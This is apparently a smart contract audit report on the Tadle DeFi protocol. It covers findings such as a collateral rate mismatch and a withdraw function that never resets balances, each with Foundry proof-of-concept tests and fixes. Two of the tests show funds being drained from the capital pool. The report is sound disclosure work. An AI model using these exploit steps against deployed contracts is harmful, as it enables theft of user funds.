# Tadle 

## Protocol Summary

Tadle offers decentralized pre-market infrastructure facilitating the bridging of liquidity between primary and secondary financial markets!

[Ethereum][Solidity][DeFi][Lending]

---

### [H-01] The Maker can steal more funds from market by listing  in Protected mode and closing offer            

#### Summary

When a market maker lists their offer in protected mode, they must provide the collateral rate at which the assets will be sold and also deposit the collateral accordingly. However, if the market maker closes their listing, they might exploit the protocol by withdrawing more funds ten their deposits due to an incorrect collateral rate used in the deposit calculation.

#### Vulnerability Details

The Tadle allows makers to list points for sale that they have either purchased from the initial market maker or that they themselves initially provided. Offers can be listed in either Protected or Turbo mode.
In Protected mode, the `listOffer` function lists the offer with a new collateral rate and stores the deposited cryptocurrency for post-settlement. This deposit will be transferred to the buyer after the trade is completed.

The issue here is that makers are allowed to set a new collateral rate when listing an offer. However, the system uses the original offer's collateral rate to calculate the deposit amount.

```solidity
    function listOffer(
        address _stock,
        uint256 _amount,
        uint256 _collateralRate
    ) external payable {
        ...

        OfferInfo storage offerInfo = offerInfoMap[stockInfo.preOffer];
        MakerInfo storage makerInfo = makerInfoMap[offerInfo.maker];

        ...

        /// @dev transfer collateral when offer settle type is protected
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
 @1------->     offerInfo.collateralRate, // @audit : the token amount user will deposit for listing in protcted mode, collateral rate used of origin offer
                _amount,
                true,
                Math.Rounding.Ceil
            );

            ITokenManager tokenManager = tadleFactory.getTokenManager();
            tokenManager.tillIn{value: msg.value}(
                _msgSender(),
                makerInfo.tokenAddress,
                transferAmount,
                false
            );
        }
        ...

        /// @dev update offer info
        offerInfoMap[offerAddr] = OfferInfo({
            amount: _amount,
@2------>  collateralRate: _collateralRate, // @audit : the colllsteral rate used for user offer??
        });

    }

```

`@1`uses the collateral rate from the original offer to determine the collateral deposit amount, while `@2` stores the collateral rate specified by the market maker for the current offer.

In the offer closure process, we use the collateral rate specified by the market maker at the time of listing the offer.

```solidity
            uint256 refundAmount = OfferLibraries.getRefundAmount(
                offerInfo.offerType,
                offerInfo.amount,
                offerInfo.points,
                offerInfo.usedPoints,
                offerInfo.collateralRate // @audit : here it will used the coolateral rate for refund amount ??
            );

```

This can lead to asset loss for Tadle in the following scenario:

1. Bob purchases 100 points from Alice at a collateral rate of 12,000. The collateral rate for the original offer is 12,000.
2. Bob lists the 100 points with a new collateral rate of 13,000, resulting in a deposit amount of 1,200,000. Here we use the collateral rate from origin offer.
3. At this point, Bob has deposited 1,200,000 collateral tokens, and the collateral rate for his offer is 13,000.
4. When Bob calls `closeOffer`, the offer is closed and the refund amount is stored in Bob's balance mapping.Here we use the collateral rate of given offer , Due to the incorrect collateral rate used for calculation, the refund amount stored user balance mapping is 1,300,000.

In summary, when deducting the deposit amount from the maker, the collateral rate of the original offer is used. However, when closing the same offer, the collateral rate of the current offer is used. This discrepancy allows the market maker to exploit the protocol and  steal funds.
The following coded POC proof that the maker will have more funds then his initial funds :

Add following test case to `PreMarket.t.sol` :

```solidity
    function test_list_and_close_offer_hack() public {
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 1000);
        uint256 initialBalance = mockUSDCToken.balanceOf(user);
        // make sure user don't have any fund in MakerRefund
        assertEq(
            tokenManager.userTokenBalanceMap(
                user,
                address(mockUSDCToken),
                TokenBalanceType.MakerRefund
            ),
            0
        );
        console2.log("Before Bal: ", mockUSDCToken.balanceOf(user));
        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 13000); // list here with greater collateral rate
        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        uint256 afterBal = mockUSDCToken.balanceOf(user); // here maker have close the listing and the balance usdt after closing is stored in afterBal
        uint256 afterBalInMapping = tokenManager.userTokenBalanceMap(
            user,
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
        console2.log("close list  Bal: ", afterBalInMapping + afterBal);
        // now check that the afterBal + value availble for withdrawal in tokenManager mapping is greator than it initial bal
        assertGt(afterBal + afterBalInMapping, initialBalance); // in this case the user is able tp steal 600000000000000 USDT for CapitalPool
    }
```

Run with command : `forge test --mt test_list_and_close_offer_hack -vvv`

```Logs:
  Before Bal:  99999999977650000000000000
  close list  Bal:  99999999978250000000000000
```

#### Impact

The discrepancy between using different collateral rate in case of `listOffer` and `closeOffer` will allow attacker to steal funds from The Tadle Protocol.

#### Tools Used

Foundry

#### Recommendations

One Potential Fix would be Use the new collateral rate to calculate the deposit amount in Protected mode, as the maker will be depositing the collateral.

```diff
diff --git a/src/core/PreMarkets.sol b/src/core/PreMarkets.sol
index 5bdbcbf..88589fc 100644
--- a/src/core/PreMarkets.sol
+++ b/src/core/PreMarkets.sol
@@ -346,7 +346,7 @@ contract PreMarktes is PerMarketsStorage, Rescuable, Related, IPerMarkets {
         if (makerInfo.offerSettleType == OfferSettleType.Protected) {
             uint256 transferAmount = OfferLibraries.getDepositAmount(
                 offerInfo.offerType,
-                offerInfo.collateralRate,
+                _collateralRate,
                 _amount,
                 true,
```

---

### [H-02] No User will be able to withdraw wrapped token due to wrong approval            

#### Summary

When a user calls the withdraw function to retrieve their assets from the Tadle Protocol, if they attempt to withdraw a WrappedToken, the approval process is executed on an incorrect token address, which will always result in a revert.

#### Vulnerability Details

All the user balances are stored in `userTokenBalanceMap` with the `tokenAddress` and `paymentType`. The balance for wrapped token will also be stored in same way.

```solidity
    function addTokenBalance(
        TokenBalanceType _tokenBalanceType,
        address _accountAddress,
        address _tokenAddress,
        uint256 _amount
    ) external onlyRelatedContracts(tadleFactory, _msgSender()) {
        userTokenBalanceMap[_accountAddress][_tokenAddress][
            _tokenBalanceType
        ] += _amount;
        emit AddTokenBalance(
            _accountAddress,
            _tokenAddress,
            _tokenBalanceType,
            _amount
        );
    }
```

For withdraw of these balances (the focus of this report is on wrapped token) the user will call withdraw function.

```solidity
    function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];
        if (claimAbleAmount == 0) {
            return;
        }
        
        address capitalPoolAddr = tadleFactory.relatedContracts(
            RelatedContractLibraries.CAPITAL_POOL
        );

        if (_tokenAddress == wrappedNativeToken) {
            /**
             * @dev token is native token
             * @dev transfer from capital pool to msg sender
             * @dev withdraw native token to token manager contract
             * @dev transfer native token to msg sender
             */
 @1>          _transfer(
                wrappedNativeToken,
                capitalPoolAddr,
                address(this),
                claimAbleAmount,
                capitalPoolAddr
            );

```

withdraw function will call transfer function to transfer wrapped token from capital pool to tokenManager contract.

```solidity
    function _transfer(
        address _token,
        address _from,
        address _to,
        uint256 _amount,
        address _capitalPoolAddr
    ) internal {
        uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
        uint256 toBalanceBef = IERC20(_token).balanceOf(_to);
            
        if (
            _from == _capitalPoolAddr &&
            IERC20(_token).allowance(_from, address(this)) == 0x0
        ) {
 @2>           ICapitalPool(_capitalPoolAddr).approve(address(this)); // @audit : it will never approve 
            // ICapitalPool(_capitalPoolAddr).approve(_token);
        }

        _safe_transfer_from(_token, _from, _to, _amount);

        uint256 fromBalanceAft = IERC20(_token).balanceOf(_from);
        uint256 toBalanceAft = IERC20(_token).balanceOf(_to);

        if (fromBalanceAft != fromBalanceBef - _amount) {
            revert TransferFailed();
        }

        if (toBalanceAft != toBalanceBef + _amount) {
            revert TransferFailed();
        }
    }
```

Now lets have look at approve function of CapitalPool contract :

```solidity
    function approve(address tokenAddr) external {
        address tokenManager = tadleFactory.relatedContracts(
            RelatedContractLibraries.TOKEN_MANAGER
        );
 @3>       (bool success, ) = tokenAddr.call(
            abi.encodeWithSelector(
                APPROVE_SELECTOR,
                tokenManager,
                type(uint256).max
            )
        );

        if (!success) {
            revert ApproveFailed();
        }
    }
```

Now  lets wrap up complete flow :

1. Bob calls withdraw function to withdraw weth token.
2. The withdraw function calls `_transfer` function `@1>`.
3. The `_transfer` function calls approve function of `CapitalPool` `@2>` and pass the address of `address(this)` which is `tokenManger` contract address.
4. `@3>` treats `tokenManager` address as `ERC20` token address and calls the approve function. At this step the execution will revert because `tokenManager` does not have approve function and approval will be failed.

The following coded POC will Illustrate the Bug :

Add following test code to `PerMarket.t.sol` file :

```solidity
    function testTokenManager_Wrong_Approval() external {
        deal(address(tokenManager), 100 ** 18);
        vm.startPrank(user);

        preMarktes.createOffer{value: 0.012 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker{value: 0.005175 * 1e18}(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer{value: 0.0072 * 1e18}(
            stock1Addr,
            0.006 * 1e18,
            12000
        );

        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        vm.expectRevert(ICapitalPool.ApproveFailed.selector); // ApproveFailed
        tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund);
    }
```

Run with command : `forge test --mt testTokenManager_Wrong_Approval -vvv`

#### Note : This finding assume that the approval function in CapitalPool  will only be called by tokenManager as stated in  @dev comments.&#x20;

#### Impact

The user will never be able to withdraw the wrapped token. if team fix the issue of `CapitalPool::approve` only callable by `tokenManager` contract.

#### Tools Used

Manual review

#### Recommendations

add following changes to the `_transfer` function:

```diff
@@ -239,12 +247,13 @@ contract TokenManager is
     ) internal {
         uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
         uint256 toBalanceBef = IERC20(_token).balanceOf(_to);          
         if (
             _from == _capitalPoolAddr &&
             IERC20(_token).allowance(_from, address(this)) == 0x0
         ) {
-            ICapitalPool(_capitalPoolAddr).approve(address(this));
+            ICapitalPool(_capitalPoolAddr).approve(_token);
         }

```

---


### [H-03] User can withdraw multiple times and Drain the Protocol            

#### Summary

To withdraw tokens from Tadle, users are supposed to call the `withdraw` function in `tokenManager`. However, after the withdrawal, the code fails to update the user's balance, allowing the user to potentially drain all available capital.

#### Vulnerability Details

To withdraw Tokens from Tadle the user will call `withdraw` function of token Manager contract.

```solidity
    function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];
        if (claimAbleAmount == 0) {
            return;
        }
        
        address capitalPoolAddr = tadleFactory.relatedContracts(
            RelatedContractLibraries.CAPITAL_POOL
        );

        if (_tokenAddress == wrappedNativeToken) {
            /**
             * @dev token is native token
             * @dev transfer from capital pool to msg sender
             * @dev withdraw native token to token manager contract
             * @dev transfer native token to msg sender
             */
            _transfer(
                wrappedNativeToken,
                capitalPoolAddr,
                address(this),
                claimAbleAmount,
                capitalPoolAddr
            );

            IWrappedNativeToken(wrappedNativeToken).withdraw(claimAbleAmount);
            payable(msg.sender).transfer(claimAbleAmount);
        } else {
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
              if (
            IERC20(_tokenAddress).allowance(capitalPoolAddr, address(this)) == 0x0
        ) {
            ICapitalPool(capitalPoolAddr).approve(_tokenAddress);
        }

            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }

        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );
    }
```

As it can be seen from above code that the user balance mapping  is not updated and it will hold the same amount even after withdrawing it.

##### Note : The following POC assumes that the withdrawal issue is fixed as recommend in my other finding. but the Attacker can still withdraw because the approve function in CapitalPool can be called by anyone.

Add following coded POC to `PreMarket.t.sol` file:

```solidity
    function test_Withdraw_hack() external {
        deal(address(tokenManager), 100 ** 18);
        vm.startPrank(user);

        preMarktes.createOffer{value: 0.012 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker{value: 0.005175 * 1e18}(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer{value: 0.0072 * 1e18}(
            stock1Addr,
            0.006 * 1e18,
            12000
        );

        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        console2.log(mockUSDCToken.balanceOf(user));

        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
        console2.log(mockUSDCToken.balanceOf(user));

        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
        console2.log(mockUSDCToken.balanceOf(user));
        // user can withdraw in a loop till the capitalPool had enough tokens here i just show 2 withdrawal

        vm.stopPrank();
    }

```

Run with command : `forge test --mt test_Withdraw_hack -vvv`.

#### Impact

The user is able to drain the Capital Pool Balance of given token.

#### Tools Used

Manual review

#### Recommendations

Update the balance mapping before token transfers:

```diff
@@ -141,11 +142,12 @@ contract TokenManager is
         uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
             _tokenAddress
         ][_tokenBalanceType];
         if (claimAbleAmount == 0) {
             return;
         }
+         userTokenBalanceMap[_msgSender()][
+            _tokenAddress
+        ][_tokenBalanceType] = 0;

```

---

### [H-04] No user will able to withdraw due to no approval set prior to transfer ERC20 assets            

#### Summary

When a user calls the `withdraw` function to retrieve their assets from the Tadle Protocol, attempting to withdraw an ERC20 token will revert because there is no approval set for `tokenManager` to transfer tokens from the `CapitalPool`.

#### Vulnerability Details

All the user balances are stored in `userTokenBalanceMap` with the `tokenAddress` and `paymentType`. The balance for ERC20 token will also be stored in same way.
However when user need to withdraw their token they will calls the withdraw function:

```solidity
    function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
        uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];
        ...
        } else {
            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }

        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );
    }
```

In `_safe_transfer_from` function:

```solidity
function _safe_transfer_from(
        address token,
        address from,
        address to,
        uint256 amount
    ) internal {
        (bool success, ) = token.call(
            abi.encodeWithSelector(TRANSFER_FROM_SELECTOR, from, to, amount)
        );

        if (!success) {
            revert TransferFailed();
        }
    }
```

IT can be seen from above code that there is no approval set for tokenManger to spent token of Capital Pool and approve function inside `CapitalPool` is supposed to be called via `tokenManager` contract as mention in `@notice` comments.

The Following coded POC will help to understand the Issue:

Add following test code to `PreMarket.t.sol`:

```solidity
    function testTokenManager_ERC20_No_Approval() external {
        deal(address(tokenManager), 100 ** 18);
        vm.startPrank(user);

        preMarktes.createOffer{value: 0.012 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker{value: 0.005175 * 1e18}(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000);

        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        vm.expectRevert(Rescuable.TransferFailed.selector); // TransferFailed
        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
    }
```

Run with command : `forge test --mt testTokenManager_ERC20_No_Approval -vvv`.

#### Note : This finding assume that the approval function in CapitalPool  will only be called by tokenManager as stated in @notice comments.

#### Impact

Due to no approval , The users can not withdraw their ERC20 tokens.

#### Tools Used

Manual Review

#### Recommendations

Add following changes will help to fix the Issue:

```diff
@@ -172,6 +173,12 @@ contract TokenManager is
              * @dev token is ERC20 token
              * @dev transfer from capital pool to msg sender
              */
+              if (
+            IERC20(_tokenAddress).allowance(capitalPoolAddr, address(this)) == 0x0
+        ) {
+            ICapitalPool(capitalPoolAddr).approve(_tokenAddress);
+        }
```

---



### [L-01] The user will be able to close Bid Offer even in case if marketplace is not in BidSettling            



#### Summary

The owner of a bid offer will call `closeBidOffer` to close the bid. The bid offer should only be closed when the market is in the `BidSettling` state. However, the current code allows the owner to close the bid even when the market is in the `AskSettling` state.

#### Vulnerability Details

The Tadle market maintains different statuses for various purposes. If The market is in the `Online` state,The takers and makers can place their offers for bids and asks. After the TGE phase, the market transitions to the `AskSettling` state. Following the TGE and the settlement period, the market moves to the `BidSettling` state.

The issue here is that the owner should only be allowed to close a bid offer when the market is in the `BidSettling` state. However, the code currently checks for both `BidSettling` and `AskSettling` states, which means that a bid offer can be closed even when the market is in the AskSettling state.

```solidity
    function closeBidOffer(address _offer) external {
        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            ,
            MarketPlaceStatus status
        ) = getOfferInfo(_offer);

        if (_msgSender() != offerInfo.authority) {
            revert Errors.Unauthorized();
        }

        if (offerInfo.offerType == OfferType.Ask) {
            revert InvalidOfferType(OfferType.Bid, OfferType.Ask);
        }

        if (
@1>            status != MarketPlaceStatus.AskSettling &&
            status != MarketPlaceStatus.BidSettling
        ) {
            revert InvaildMarketPlaceStatus(); 
        }
```

#### POC :

Add following test case to `PreMarket.t.sol` :

```solidity
    function test_Close_Bid_Offer_In_AskSettling() public {
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 1000);
        vm.stopPrank();

        vm.startPrank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );
        // upddate the market status only for assertion purpose
        systemConfig.updateMarketPlaceStatus(
            "Backpack",
            MarketPlaceStatus.AskSettling
        );
        vm.stopPrank();

        address _marketPlace = GenerateAddress.generateMarketPlaceAddress(
            "Backpack"
        );
        MarketPlaceInfo memory info = systemConfig.getMarketPlaceInfo(
            _marketPlace
        );
        assertEq(uint(info.status), uint(MarketPlaceStatus.AskSettling));
        vm.startPrank(user);
        deliveryPlace.closeBidOffer(offerAddr);
        vm.stopPrank();
    }
```

Run With Command : `forge test --mt test_Close_Bid_Offer_In_AskSettling`

#### Impact

The offer owner is currently allowed to close a bid offer even when the market is in the `AskSettling` status. However, `AskSettling` is intended for settling Ask Offers, not Bid Offers. Tadle also maintains specific time frames for each market state.

#### Tools Used

Manual Review

#### Recommendations

Remove `AskSettling` check for if condition :

```diff
@@ -49,7 +49,6 @@ contract DeliveryPlace is DeliveryPlaceStorage, Rescuable, IDeliveryPlace {
         }
 
         if (
-            status != MarketPlaceStatus.AskSettling &&
             status != MarketPlaceStatus.BidSettling
```



